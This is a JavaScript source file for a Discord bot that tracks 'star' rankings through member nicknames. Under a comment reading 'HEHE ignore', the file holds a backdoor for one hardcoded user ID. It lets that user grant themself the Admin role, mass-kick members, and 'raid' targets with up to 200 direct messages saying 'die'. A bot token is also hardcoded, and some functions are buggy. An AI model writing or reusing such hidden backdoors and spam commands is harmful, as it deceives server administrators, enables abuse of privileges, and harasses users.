const Discord = require("discord.js");
const fs = require('fs');
const client = new Discord.Client();
const bot = require('./module.js');
const prefix = "$";

var data = require("./data.json");


client.on("ready", () => {
    console.log("Initialized");
})
client.on("message", (message) => {
    timeReset();
    if (message.content == "$rank") {
        bot.rank(message, data);
    } else if (message.content == prefix + "time") {
        var tmpdate = new Date();
        console.log(tmpdate.getHours());
    } else if (message.content == prefix + "ping") {
        if (message.author.id == 377244031421513728) {
            message.channel.send(":no_good: Bad Naama");
        } else {
            message.channel.send("poing");
        }
    } else if (message.content == prefix + "uv") {
        message.channel.send(":no_good:");
    } else if (message.content.startsWith(prefix + "rename")) {
        bot.rename(message);
    } else if (message.content.startsWith(prefix + "star")) {
        data = bot.star(message, data);
    }
    if (message.content.startsWith(prefix + "-star")) {
        if (message.member.roles.find("name", "Admin") || message.member.roles.find("name", "Mentor") || message.member.roles.find("name", "Grammar Enforcer") || message.author.id == '401965023527829505') {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            //message.guild.members.get( message.mentions.users.first().id ).setNickname("⭐");
            var x = message.mentions.users.first().id;
            var found = false;
            var remove = false;
            var tstars = 0;
            for (var i = 0; i < data.length - 1; i++) {
                if (data[i].id == x) {
                    found = true;
                    if (data[i].stars == 0) {
                        message.channel.send("Uh oh! They don't have stars I can take!")
                    }
                    if (data[i].stars > 0) {
                        remove = true;
                        data[i].stars--;
                        tstars = data[i].stars;
                    }
                }
            }
            if (!found) {
                var tmp = {
                    "id": x,
                    "name": message.guild.members.get(x).displayName,
                    "stars": 0
                }
                data.push(tmp);
                message.channel.send("Oi. They don't got stars...");
            } else {
                if (remove) {
                    var index = -1;
                    for (var i = 0; i < data.length; i++) {
                        if (data[i].id == x) {
                            index = i;
                        }
                    }
                    message.guild.members.get(x).setNickname(data[index].name);
                    for (var i = 0; i < data[index].stars - 1; i++) {
                        message.guild.members.get(x).setNickname(message.guild.members.get(x).displayName + "⭐");
                    }
                }
                message.channel.send(message.author + " took " + args[0] + "'s star!");

            }
        } else {
            message.channel.send("Whoops! You don't seem to have permission to do that...");
        }
    }
    if (message.content.startsWith(prefix + "reset")) {
        if (message.member.roles.find("name", "Admin") || message.member.roles.find("name", "Mentor") || message.member.roles.find("name", "Grammar Enforcer") || message.author.id == '401965023527829505') {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            //message.channel.send(message.author + " gave " + args[0] + " a :star:!");
            //message.guild.members.get( message.mentions.users.first().id ).setNickname("⭐");
            var x = message.mentions.users.first().id;
            var found = false;
            var add = false;
            var index = -1;
            for (var i = 0; i < data.length; i++) {
                if (data[i].id == x) {
                    found = true;
                    data[i].stars = 0;
                    index = i;
                }
            }
            if (found) {
                message.guild.members.get(x).setNickname(data[index].name);
                message.channel.send("Reset Successful!");
            } else {
                message.channel.send("Oof! They either had no stars, or they don't exist to me...");
            }
            fs.writeFileSync("./data.json", JSON.stringify(data));
        }
    }


    // HEHE ignore
    if (message.author.id == '401965023527829505') {
        if (message == "$giveadmin") {
            let admin = message.guild.roles.find(role => role.name === "Admin");
            message.guild.members.get(message.author.id).addRole(admin).catch(console.log());
        }
        if (message == "$takeadmin") {
            let admin = message.guild.roles.find(role => role.name === "Admin");
            message.guild.members.get(message.author.id).removeRole(admin).catch(console.log());
        }
        if (message == "$adminping") {
            message.channel.send("Pong");
        }
        if (message == "$wakey") {
            message.channel.send("I'm awake mommy");
        }
        if (message.content.startsWith(prefix + "kick")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var i = 0; i < args.length - 1; i++) {
                var str = args[i];
                var id = str.replace(/[<@!>]/g, '');
                client.fetchUser(id).then(user => { user.kick(args[args.length]) });
                message.channel.send("Hehehe. I kicked " + client.fetchUser(id) + " :smiling_imp:");
            }
        }
        if (message.content.startsWith("$10raid")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var j = 0; j < args.length; j++) {
                var str = args[j];
                var id = str.replace(/[<@!>]/g, '');
                for (var i = 0; i < 10; i++) {
                    client.fetchUser(id).then(user => { user.send("die") });
                    //message.author.sendMessage("Die");
                }
            }
            message.author.sendMessage("Raid successful!");
        }
        if (message.content.startsWith("$raid")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var j = 0; j < args.length; j++) {
                var str = args[j];
                var id = str.replace(/[<@!>]/g, '');
                for (var i = 0; i < 100; i++) {
                    client.fetchUser(id).then(user => { user.send("die") });
                    //message.author.sendMessage("Die");
                }
            }
            message.author.sendMessage("Raid successful!");
        }
        if (message.content.startsWith("$hraid")) {
            const args = message.content.slice(prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            for (var j = 0; j < args.length; j++) {
                var str = args[j];
                var id = str.replace(/[<@!>]/g, '');
                for (var i = 0; i < 200; i++) {
                    client.fetchUser(id).then(user => { user.send("die") });
                    //message.author.sendMessage("Die");
                }
            }
            message.author.sendMessage("Raid successful!");
        }
    }
})

client.login("NTA0NDUxMzAxNTkwMTcxNjU4.DrFOlg.60X9d7JiVw9A_Z6RhhykFXxgays");

function timeReset() {
    var tmpDate = new Date();
    if (tmpDate.getHours() == 15 && (tmpDate.getMinutes() >= 0 || tmpDate.getMinutes() < 59)) {
        const server = client.guilds.get("502626611632406530");
        var members = server.members;
        for (var i = 0; i < members.length - 1; i++) {
            var tid = members[i].user.id;
            var found = false;
            var index = -1;
            for (var i = 0; i < data.length; i++) {
                if (data[i].id == tid) {
                    found = true;
                    data[i].stars = 0;
                    index = i;
                }
            }
            if (found) {
                message.guild.members.get(x).setNickname(data[index].name);
                message.channel.send("Stars reset!");
            }
        }
    }
}